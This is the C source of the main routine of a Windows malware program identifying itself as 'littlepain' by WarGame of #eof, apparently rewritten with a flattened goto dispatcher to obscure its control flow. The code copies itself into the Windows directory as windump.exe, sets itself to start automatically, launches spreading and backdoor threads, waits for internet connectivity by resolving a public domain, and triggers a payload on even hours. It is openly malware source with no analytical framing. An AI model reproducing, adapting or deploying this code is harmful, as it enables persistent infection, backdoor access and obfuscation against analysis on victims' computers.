#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

#pragma optimize("", off)
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    volatile int dummy_state = 1;
    char my_path[MAX_PATH], new_path[MAX_PATH];
    DWORD ThreadID;
    WSADATA wsa;
    SYSTEMTIME time;
    int ret_val = 0;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 7) goto dummy_state_7;
    if (dummy_state == 8) goto dummy_state_8;
    if (dummy_state == 9) goto dummy_state_9;
    if (dummy_state == 10) goto dummy_state_10;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    CreateMutexA(NULL, FALSE, "__[__ littlepain by [WarGame,#eof] __]__");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ExitProcess(0);
    }
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    GetModuleFileNameA(NULL, my_path, MAX_PATH);
    GetWindowsDirectoryA(new_path, MAX_PATH);
    strcat(new_path, "\\windump.exe");
    CopyFileA(my_path, new_path, FALSE);
    _AutoStart((BYTE*)new_path);
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    if (WSAStartup(MAKEWORD(1,1), &wsa) != 0)
    {
        ret_val = 0;
        dummy_state = 0;
        goto dummy_dispatcher;
    }
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_L0cal_4, new_path, 0, &ThreadID);
    dummy_state = 5;
    goto dummy_dispatcher;

dummy_state_5:
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_BackDoor_4, NULL, 0, &ThreadID);
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_6:
    if (!gethostbyname("www.freetibet.org"))
    {
        dummy_state = 7;
        goto dummy_dispatcher;
    }
    dummy_state = 8;
    goto dummy_dispatcher;

dummy_state_7:
    Sleep(1000*60*20);
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_8:
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extra, new_path, 0, &ThreadID);
    dummy_state = 9;
    goto dummy_dispatcher;

dummy_state_9:
    GetSystemTime(&time);
    if (time.wHour % 2 == 0)
    {
        _Payload();
    }
    dummy_state = 10;
    goto dummy_dispatcher;

dummy_state_10:
    Sleep(INFINITE);
    ret_val = 0;
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return ret_val;
}
#pragma optimize("", on)
